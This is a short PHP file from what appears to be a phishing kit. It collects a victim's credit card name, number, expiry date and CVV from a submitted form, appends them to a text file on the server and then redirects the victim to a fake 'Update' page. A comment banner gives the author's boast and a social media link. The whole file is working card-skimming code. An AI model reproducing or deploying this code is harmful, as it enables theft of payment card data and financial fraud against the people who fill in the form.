<?php
include '../Mckay‎‏/zero2.php';
include 'zero2.php';
/*
##############################################################
                           LOVE is fake
##############################################################
                           MR fake is me	
##############################################################
              https://web.facebook.com/yackson.garcia.161	
##############################################################			  
*/

$zeidan .="=========== <[ credit card ]> ===========\n";
$zeidan .="Name		          : ".$_POST['n_card']."\n";
$zeidan .="Card Number		  : ".$_POST['c_num']."\n";
$zeidan .="month              : ".$_POST['exm']."\n";
$zeidan .="year               : ".$_POST['exy']."\n";
$zeidan .="CVV                : ".$_POST['csc']."\n";
$zeidan .="------------------------------------------\n";
$file = fopen("../../Attention.txt", 'a');
fwrite($file, $zeidan);
header ("Location:../../usa/Update.php");
?>